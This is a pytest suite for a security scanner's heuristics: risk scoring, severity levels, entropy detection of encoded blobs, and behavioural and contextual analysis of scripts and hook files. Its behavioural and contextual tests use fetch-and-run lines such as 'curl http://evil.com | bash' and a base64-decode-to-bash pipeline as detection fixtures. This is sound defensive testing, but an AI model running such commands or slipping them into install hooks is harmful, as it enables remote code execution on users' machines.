from security_scanner.heuristics.scoring import RiskScorer, ScoreModifier
from security_scanner.heuristics.severity import SeverityClassifier
from security_scanner.heuristics.entropy import EntropyAnalyzer
from security_scanner.heuristics.behavioral import BehavioralAnalyzer
from security_scanner.heuristics.contextual import ContextualAnalyzer
from pathlib import Path


class TestRiskScorer:
    def test_default_score(self):
        scorer = RiskScorer()
        assert scorer.calculate() == 50.0

    def test_modifier_addition(self):
        scorer = RiskScorer(base_score=30.0)
        scorer.add_modifier(ScoreModifier.AUTO_EXECUTION)
        assert scorer.calculate() == 50.0

    def test_multiple_modifiers(self):
        scorer = RiskScorer(base_score=20.0)
        scorer.add_modifier(ScoreModifier.AUTO_EXECUTION)
        scorer.add_modifier(ScoreModifier.NETWORK_ACCESS)
        scorer.add_modifier(ScoreModifier.SHELL_EXECUTION)
        score = scorer.calculate()
        assert score == 70.0

    def test_score_capped_at_100(self):
        scorer = RiskScorer(base_score=80.0)
        scorer.add_modifier(ScoreModifier.AUTO_EXECUTION)
        scorer.add_modifier(ScoreModifier.PERSISTENCE)
        scorer.add_modifier(ScoreModifier.SUPPLY_CHAIN)
        assert scorer.calculate() <= 100.0

    def test_from_finding_characteristics(self):
        scorer = RiskScorer.from_finding_characteristics(
            has_auto_exec=True,
            has_remote_download=True,
            has_shell_exec=True,
            has_supply_chain=True,
            signal_count=3,
        )
        score = scorer.calculate()
        assert score > 70.0

    def test_severity_from_score(self):
        assert RiskScorer(base_score=95.0).severity == "CRITICAL"
        assert RiskScorer(base_score=70.0).severity == "HIGH"
        assert RiskScorer(base_score=50.0).severity == "MEDIUM"

    def test_to_dict(self):
        scorer = RiskScorer(base_score=40.0)
        scorer.add_modifier(ScoreModifier.OBFUSCATION)
        d = scorer.to_dict()
        assert d["base_score"] == 40.0
        assert len(d["modifiers"]) == 1
        assert d["final_score"] > 40.0


class TestSeverityClassifier:
    def test_from_score(self):
        assert SeverityClassifier.from_score(95) == "CRITICAL"
        assert SeverityClassifier.from_score(70) == "HIGH"
        assert SeverityClassifier.from_score(50) == "MEDIUM"
        assert SeverityClassifier.from_score(30) == "LOW"
        assert SeverityClassifier.from_score(10) == "INFO"

    def test_from_signal_count(self):
        assert SeverityClassifier.from_signal_count(5) == "CRITICAL"
        assert SeverityClassifier.from_signal_count(3) == "HIGH"
        assert SeverityClassifier.from_signal_count(2) == "MEDIUM"
        assert SeverityClassifier.from_signal_count(1) == "LOW"

    def test_combine(self):
        assert SeverityClassifier.combine("HIGH", "MEDIUM") == "HIGH"
        assert SeverityClassifier.combine("MEDIUM", "CRITICAL") == "CRITICAL"

    def test_requires_attention(self):
        assert SeverityClassifier.requires_attention("CRITICAL") is True
        assert SeverityClassifier.requires_attention("HIGH") is True
        assert SeverityClassifier.requires_attention("MEDIUM") is False


class TestEntropyAnalyzer:
    def test_analyze_line_low(self):
        result = EntropyAnalyzer().analyze_line("print('hello world')")
        assert result["flagged"] is False

    def test_analyze_line_high(self):
        b64 = "dGhpcyBpcyBhIHRlc3Qgc3RyaW5nIGZvciBlbnRyb3B5IHdpdGggbW9yZSBjaGFyYWN0ZXJz"
        result = EntropyAnalyzer(threshold=4.0).analyze_line(b64)
        assert result["flagged"] is True

    def test_high_entropy_blobs(self):
        text = "some text dGhpcyBpcyBhIHRlc3Qgc3RyaW5nIGZvciBlbnRyb3B5IHdpdGggbW9yZSBjaGFyYWN0ZXJz more"
        blobs = EntropyAnalyzer(threshold=4.5).high_entropy_blobs(text, min_length=20)
        assert len(blobs) > 0

    def test_global_entropy(self):
        e = EntropyAnalyzer().global_entropy("dGhpcyBpcyBhIHRlc3Qgc3RyaW5n")
        assert e > 0


class TestBehavioralAnalyzer:
    def test_pipeline_download_bash(self):
        result = BehavioralAnalyzer().analyze_pipelines("curl http://evil.com | bash")
        assert len(result) > 0
        assert any(r["severity"] == "CRITICAL" for r in result)

    def test_pipeline_base64_decode(self):
        result = BehavioralAnalyzer().analyze_pipelines(
            "echo dGVzdA== | base64 -d | bash"
        )
        assert len(result) > 0

    def test_chains_download_shell(self):
        result = BehavioralAnalyzer().analyze_chains(
            "curl http://evil.com | bash | base64"
        )
        assert len(result) > 0

    def test_analyze(self):
        result = BehavioralAnalyzer().analyze("curl http://evil.com | bash")
        assert "pipelines" in result
        assert len(result["pipelines"]) > 0


class TestContextualAnalyzer:
    def test_analyze_file_path(self):
        context = ContextualAnalyzer.analyze_file_path(Path("/project/.git/hooks/pre-commit"))
        assert context["in_git_hooks"] is True
        assert context["sensitivity"] >= 95.0

    def test_analyze_file_path_vscode(self):
        context = ContextualAnalyzer.analyze_file_path(Path("/project/.vscode/tasks.json"))
        assert context["in_vscode"] is True
        assert context["is_config"] is True

    def test_analyze_auto_execution(self):
        result = ContextualAnalyzer.analyze_auto_execution(
            "postinstall: curl http://evil | bash"
        )
        assert result["has_auto_execution"] is True
        assert "npm_postinstall" in result["auto_execution_types"]

    def test_estimate_risk_boost(self):
        boost = ContextualAnalyzer.estimate_risk_boost(
            {"in_git_hooks": True, "in_vscode": True}, signal_count=3
        )
        assert boost > 0
